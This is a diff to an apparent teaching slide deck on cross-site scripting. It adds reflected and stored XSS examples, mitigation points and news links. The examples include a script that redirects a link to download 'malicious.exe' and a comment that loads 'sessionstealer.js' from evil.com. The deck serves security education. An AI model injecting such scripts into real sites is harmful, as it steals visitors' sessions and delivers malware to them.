@@ -41,6 +41,17 @@ transition: slide
 - Occurs when the attack is reflected off of the web server, E.g: search results, errors
 - The attack is usually in the form of a malicious URL, which the victim unknowingly opens.
 
+</section>
+
+<section data-markdown>
+
+## Reflected XSS Examples
+
+- http://example.com/index.php?user=<script>alert(123)</script>
+- This will cause a popup, stating '123' to appear.
+- http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");
+AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script>
+- his will cause the user, clicking on the link supplied by the tester, to download the file malicious.exe from a site he controls.
 
 </section>
 
@@ -50,9 +61,9 @@ transition: slide
 
 - For the common user:
 - Common sense.
-- Don't click random, suspicious links in emails, social media, forums.
+- Don't click random, suspicious links in emails, social media, forums. Be vigilant.
 - For the website owner:
-- 
+- URL Sanitisation
 
 </section>
 
@@ -60,7 +71,20 @@ transition: slide
 
 ## Stored XSS
 
+- This happens when malicious code is injected into the site/application itself.
+- Whenever a victim visits the compromised site, the script is executed.
 
+</section>
+
+<section data-markdown>
+
+## Stored XSS Example
+
+- E.g: A hacker finds a website with a comment section that allows embedded html.
+- They post the comment "Security sux! <script src="http://evil.com/sessionstealer.js"> </script>"
+- Now, whenever the page is visited, the script (which is hosted externally) is run.
+- So, unlike Reflected XSS, the victim only has to visit the page, not even actively click anything, to
+  be attacked.
 
 </section>
 
@@ -68,15 +92,21 @@ transition: slide
 
 ## Mitigating Stored XSS
 
-
+- Never insert untrusted data except in allowed locations.
+- HTML escaping.
+- Attribute escaping.
+- JavaScript escaping.
 
 </section>
 
 <section data-markdown>
 
-## Example
+## Real world examples
+- XSS on Twitter
+- https://www.theguardian.com/technology/2014/jun/11/twitter-tweetdeck-xss-flaw-users-vulnerable
 
-https://www.theguardian.com/technology/2014/jun/11/twitter-tweetdeck-xss-flaw-users-vulnerable
+- (Sort of)
+- https://www.theregister.co.uk/2018/01/27/cryptojackers_slip_coinhive_mining_code_into_doubleclick_ads/
 
 </section>
 
